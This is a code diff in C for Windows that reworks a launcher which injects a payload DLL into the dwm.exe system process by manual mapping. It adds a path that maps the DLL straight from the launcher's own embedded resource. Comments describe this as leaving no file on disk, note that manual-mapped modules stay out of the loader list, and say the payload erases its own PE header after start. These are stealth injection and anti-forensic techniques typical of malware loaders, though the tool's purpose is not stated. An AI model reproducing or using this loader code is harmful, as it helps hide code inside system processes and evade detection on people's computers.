@@ -182,33 +182,25 @@ static DWORD WINAPI shellcode_loader(loader_data_t *pData)
 static void shellcode_loader_end(void) { }
 
 /* ── Manual map ───────────────────────────────────────────────── */
-static int manual_map(HANDLE hProc, const char *dllPath, char *err, size_t err_sz) {
-    /* Read DLL file. */
-    HANDLE hFile = CreateFileA(dllPath, GENERIC_READ, FILE_SHARE_READ,
-                               NULL, OPEN_EXISTING, 0, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) {
-        _snprintf(err, err_sz - 1, "open DLL %s: %lu", dllPath, GetLastError());
+/* Manual-map from raw bytes already in memory. `sourceBytes` may be an
+ * embedded-resource pointer or a memcpy of a file — we take a private
+ * copy either way so the caller can free their source. */
+static int manual_map_from_bytes(HANDLE hProc, const BYTE *sourceBytes,
+                                 DWORD sourceLen, char *err, size_t err_sz) {
+    if (!sourceBytes || sourceLen < 0x400) {
+        _snprintf(err, err_sz - 1, "bad payload bytes (len=%lu)", sourceLen);
         err[err_sz - 1] = 0;
         return 0;
     }
-    DWORD fileSize = GetFileSize(hFile, NULL);
+    DWORD fileSize = sourceLen;
     BYTE *fileData = (BYTE *)VirtualAlloc(NULL, fileSize, MEM_COMMIT, PAGE_READWRITE);
     if (!fileData) {
-        CloseHandle(hFile);
         _snprintf(err, err_sz - 1, "VirtualAlloc(local) failed");
         err[err_sz - 1] = 0;
         return 0;
     }
-    DWORD readBytes = 0;
-    ReadFile(hFile, fileData, fileSize, &readBytes, NULL);
-    CloseHandle(hFile);
-    if (readBytes != fileSize) {
-        VirtualFree(fileData, 0, MEM_RELEASE);
-        _snprintf(err, err_sz - 1, "short read %lu/%lu", readBytes, fileSize);
-        err[err_sz - 1] = 0;
-        return 0;
-    }
-    slog_writef("launcher.log", "mm: read %lu bytes from %s", fileSize, dllPath);
+    memcpy(fileData, sourceBytes, fileSize);
+    slog_writef("launcher.log", "mm: %lu bytes from memory", fileSize);
 
     /* Parse PE. */
     IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)fileData;
@@ -310,13 +302,11 @@ static int manual_map(HANDLE hProc, const char *dllPath, char *err, size_t err_s
     return 1;
 }
 
-int inject_dwm_payload(const char *payload_dll_path, char *err, size_t err_sz) {
-    if (!payload_dll_path || !err) return 0;
-    if (GetFileAttributesA(payload_dll_path) == INVALID_FILE_ATTRIBUTES) {
-        _snprintf(err, err_sz - 1, "payload dll missing: %s", payload_dll_path);
-        err[err_sz - 1] = 0;
-        return 0;
-    }
+/* Common inject helper — open dwm, map payload from raw bytes, close. */
+static int inject_from_bytes_common(const BYTE *bytes, DWORD len,
+                                    const char *src_label,
+                                    char *err, size_t err_sz) {
+    if (!bytes || !len || !err) return 0;
     if (!enable_debug_priv()) {
         _snprintf(err, err_sz - 1, "SeDebugPrivilege denied");
         err[err_sz - 1] = 0;
@@ -327,10 +317,6 @@ int inject_dwm_payload(const char *payload_dll_path, char *err, size_t err_sz) {
         _snprintf(err, err_sz - 1, "dwm.exe not found"); err[err_sz - 1] = 0;
         return 0;
     }
-    /* NOTE: we do NOT skip if inject_is_loaded — manual-mapped DLLs don't
-     * show in PEB.Ldr anyway. Idempotency comes from the payload itself
-     * checking Global\SVCLDB_Shutdown state on init (v1.1). */
-
     HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
                                PROCESS_VM_WRITE | PROCESS_VM_READ |
                                PROCESS_QUERY_INFORMATION,
@@ -340,8 +326,75 @@ int inject_dwm_payload(const char *payload_dll_path, char *err, size_t err_sz) {
         err[err_sz - 1] = 0;
         return 0;
     }
-    int ok = manual_map(hProc, payload_dll_path, err, err_sz);
+    int ok = manual_map_from_bytes(hProc, bytes, len, err, err_sz);
     CloseHandle(hProc);
-    if (ok) slog_writef("launcher.log", "inject ok (manual map) pid=%lu", pid);
+    if (ok) slog_writef("launcher.log", "inject ok (%s) pid=%lu bytes=%lu",
+                       src_label ? src_label : "?", pid, len);
     return ok;
+}
+
+/* Legacy: inject from a DLL on disk. Reads whole file into memory, then
+ * hands off to inject_from_bytes_common. Kept for debug tooling. */
+int inject_dwm_payload(const char *payload_dll_path, char *err, size_t err_sz) {
+    if (!payload_dll_path || !err) return 0;
+    HANDLE hFile = CreateFileA(payload_dll_path, GENERIC_READ, FILE_SHARE_READ,
+                               NULL, OPEN_EXISTING, 0, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        _snprintf(err, err_sz - 1, "payload dll missing: %s", payload_dll_path);
+        err[err_sz - 1] = 0;
+        return 0;
+    }
+    DWORD fileSize = GetFileSize(hFile, NULL);
+    BYTE *buf = (BYTE *)VirtualAlloc(NULL, fileSize, MEM_COMMIT, PAGE_READWRITE);
+    DWORD read = 0;
+    ReadFile(hFile, buf, fileSize, &read, NULL);
+    CloseHandle(hFile);
+    int ok = (read == fileSize) ?
+        inject_from_bytes_common(buf, fileSize, "file", err, err_sz) : 0;
+    VirtualFree(buf, 0, MEM_RELEASE);
+    return ok;
+}
+
+/* Primary path: inject the DLL embedded as a resource in the launcher
+ * exe itself. Zero disk footprint — no dwmapiext.dll ever hits the
+ * filesystem. FindResource + LoadResource + LockResource gives us a
+ * pointer to raw resource bytes in our own .rsrc section, which
+ * inject_from_bytes_common memcpy's into a fresh page then feeds to
+ * manual_map. */
+int inject_dwm_payload_from_resource(void *self_v, int resource_id,
+                                     char *err, size_t err_sz) {
+    HMODULE self = (HMODULE)self_v;
+    if (!self || !err) return 0;
+    HRSRC rsrc = FindResourceA(self, MAKEINTRESOURCEA(resource_id), (LPCSTR)RT_RCDATA);
+    if (!rsrc) {
+        _snprintf(err, err_sz - 1, "FindResource %d: %lu", resource_id, GetLastError());
+        err[err_sz - 1] = 0;
+        slog_writef("launcher.log", "resource inject: FindResource FAILED gle=%lu",
+                    GetLastError());
+        return 0;
+    }
+    DWORD sz = SizeofResource(self, rsrc);
+    HGLOBAL hg = LoadResource(self, rsrc);
+    const BYTE *bytes = (const BYTE *)LockResource(hg);
+    slog_writef("launcher.log",
+                "resource inject: rsrc=%p sz=%lu hg=%p bytes=%p mz=0x%02X%02X",
+                rsrc, sz, hg, bytes,
+                bytes ? bytes[0] : 0, bytes ? bytes[1] : 0);
+    if (!bytes || sz < 0x400) {
+        _snprintf(err, err_sz - 1, "resource %d bad (sz=%lu bytes=%p)",
+                  resource_id, sz, bytes);
+        err[err_sz - 1] = 0;
+        return 0;
+    }
+    /* Sanity: MZ header check on embedded payload. Note: the payload's
+     * DllMain wipes its own MZ AFTER init — but the on-disk embedded
+     * copy still has 'MZ' since we embedded before the payload runs. */
+    if (bytes[0] != 'M' || bytes[1] != 'Z') {
+        _snprintf(err, err_sz - 1, "resource %d not a PE (mz=%02X%02X)",
+                  resource_id, bytes[0], bytes[1]);
+        err[err_sz - 1] = 0;
+        slog_writef("launcher.log", "resource inject: MZ signature missing — resource corrupt");
+        return 0;
+    }
+    return inject_from_bytes_common(bytes, sz, "resource", err, err_sz);
 }
